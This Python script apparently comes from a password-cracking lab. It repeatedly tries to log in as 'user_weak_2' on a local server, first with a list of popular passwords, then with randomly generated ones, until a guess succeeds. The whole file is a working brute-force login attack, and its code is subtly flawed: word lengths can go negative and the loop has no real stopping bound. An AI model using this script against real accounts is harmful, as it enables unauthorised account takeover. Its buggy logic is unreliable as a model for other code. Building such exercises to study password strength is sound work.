from crack.client import LoginClient
import secrets
import string


group_seed = 413134
#base_url = 'http://192.168.1.103:5000'
base_url = 'http://localhost:5000'


def generate_medium_password():
    # leave space for 2 digits + 1 symbol
    word_len = secrets.randbelow(17) - 3

    # generate word
    word = ''.join(secrets.choice(string.ascii_lowercase) for _ in range(word_len))

    # randomly capitalize or not
    if secrets.choice([True, False]):
        word = word.capitalize()

    digits = ''.join(secrets.choice(string.digits) for _ in range(2))
    symbol = secrets.choice("!@#$%^&*")

    return word + digits + symbol


def generate_strong_password(min_len=2, max_len=16):
    length = secrets.randbelow(max_len - min_len + 1) + min_len
    return ''.join(secrets.choice(string.ascii_lowercase) for _ in range(length))


weak_passwords = []
with open('crack/popular_passwords.txt', 'r') as f:
    for line in f:
        weak_passwords.append(line.strip())

counter = 0
ok = False
client = LoginClient(base_url, group_seed)

username = 'user_weak_2'

while counter < 50000 or not ok:
    if counter < 10000:
        password = weak_passwords[counter]
    elif counter < 40000:
        password = generate_medium_password()
    else:
        password = generate_strong_password()

    ok = client.attempt_login_once(username, password)
    if ok:
        print(f"{username}, {password}, Broke after {counter} iterations")
        break
    else:
        #print(f"{username}, {password}, Fail!")
        counter = counter + 1